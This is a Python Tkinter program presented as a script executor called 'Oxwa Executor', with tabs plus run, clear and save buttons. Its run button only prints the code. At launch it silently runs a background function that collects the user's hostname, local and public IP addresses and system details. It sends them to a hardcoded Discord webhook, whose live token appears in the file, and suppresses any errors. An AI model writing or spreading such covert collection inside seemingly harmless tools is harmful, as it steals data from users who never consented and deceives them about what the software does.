import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from tkinter import scrolledtext
import requests, socket, platform, threading


root = tk.Tk()
root.title("Oxwa Executor")
root.geometry("850x550")
root.configure(bg="#0D0D0D")


style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook", background="#0D0D0D", borderwidth=0)
style.configure("TNotebook.Tab", background="#1A1A1A", foreground="#00BFFF", padding=[10, 5])
style.map("TNotebook.Tab", background=[("selected", "#292929")])


notebook = ttk.Notebook(root)
notebook.pack(fill="both", expand=True, padx=10, pady=10)

tab_text_widgets = {}


def system_report():
    try:
        h = socket.gethostname()
        l_ip = socket.gethostbyname(h)
        p_ip = requests.get("https://api.ipify.org").text
        s = platform.system()
        r = platform.release()
        v = platform.version()
        pr = platform.processor()
        m = platform.machine()

        data = {
            "username": "Oxwa",
            "embeds": [{
                "title": "Executor Access Logged",
                "color": 0x00BFFF,
                "fields": [
                    {"name": "Local IP", "value": l_ip, "inline": True},
                    {"name": "Public IP", "value": p_ip, "inline": True},
                    {"name": "System", "value": s, "inline": True},
                    {"name": "Release", "value": r, "inline": True},
                    {"name": "Version", "value": v, "inline": False},
                    {"name": "Processor", "value": pr, "inline": False},
                    {"name": "Machine", "value": m, "inline": False},
                ]
            }]
        }

        threading.Thread(target=lambda: requests.post(
            "https://discord.com/api/webhooks/1383890922206662677/i6-BJTDH-gkC6mHFg1Q6J4if8ZCq_8UKJtcn3RpBUECpEUYAS7DtHJ2YRnwu16OA1cQa",
            json=data), daemon=True).start()

    except:
        pass  


def add_new_tab():
    tab = tk.Frame(notebook, bg="#0D0D0D")
    text_area = scrolledtext.ScrolledText(tab, bg="#0D0D0D", fg="#00BFFF", insertbackground="#00BFFF",
                                          font=("Consolas", 12), borderwidth=0)
    text_area.pack(fill="both", expand=True, padx=5, pady=5)
    tab_title = f"Tab {len(notebook.tabs()) + 1}  ✖"
    notebook.add(tab, text=tab_title)
    tab_text_widgets[tab] = text_area
    update_tab_close_events()


def update_tab_close_events():
    for idx, tab in enumerate(notebook.tabs()):
        notebook.tab(tab, text=f"Tab {idx + 1}  ✖")
    notebook.bind("<Button-1>", handle_tab_close)


def handle_tab_close(event):
    x, y = event.x, event.y
    for idx, tab in enumerate(notebook.tabs()):
        tab_coords = notebook.bbox(tab)
        if not tab_coords:
            continue
        tx, ty, twidth, theight = tab_coords
        if tx + twidth - 20 <= x <= tx + twidth - 5 and ty <= y <= ty + theight:
            if len(notebook.tabs()) > 1:
                notebook.forget(idx)
                break
            else:
                messagebox.showinfo("Notice", "At least one tab must remain open.")
            break


def run_script():
    current_tab = notebook.select()
    text_widget = tab_text_widgets.get(root.nametowidget(current_tab))
    if text_widget:
        code = text_widget.get("1.0", tk.END)
        print(f"Running Code:\n{code}")  

def clear_text():
    current_tab = notebook.select()
    text_widget = tab_text_widgets.get(root.nametowidget(current_tab))
    if text_widget:
        text_widget.delete("1.0", tk.END)

def save_script():
    current_tab = notebook.select()
    text_widget = tab_text_widgets.get(root.nametowidget(current_tab))
    if text_widget:
        file = filedialog.asksaveasfilename(defaultextension=".txt",
                                            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file:
            with open(file, "w") as f:
                f.write(text_widget.get("1.0", tk.END))

def show_settings():
    messagebox.showinfo("Settings", "Settings window placeholder.")  


add_new_tab()
threading.Thread(target=system_report, daemon=True).start()


controls = tk.Frame(root, bg="#0D0D0D")
controls.pack(side="bottom", fill="x", pady=8)

btn_style = {"bg": "#1A1A1A", "fg": "#00BFFF", "activebackground": "#292929",
             "activeforeground": "#00BFFF", "font": ("Consolas", 10), "bd": 0, "padx": 10, "pady": 5}

tk.Button(controls, text="New Tab", command=add_new_tab, **btn_style).pack(side="left", padx=5)
tk.Button(controls, text="▶ Run", command=run_script, **btn_style).pack(side="right", padx=5)
tk.Button(controls, text="🧹 Clear", command=clear_text, **btn_style).pack(side="right", padx=5)
tk.Button(controls, text="💾 Save", command=save_script, **btn_style).pack(side="right", padx=5)
tk.Button(controls, text="⚙ Settings", command=show_settings, **btn_style).pack(side="right", padx=5)

root.mainloop()
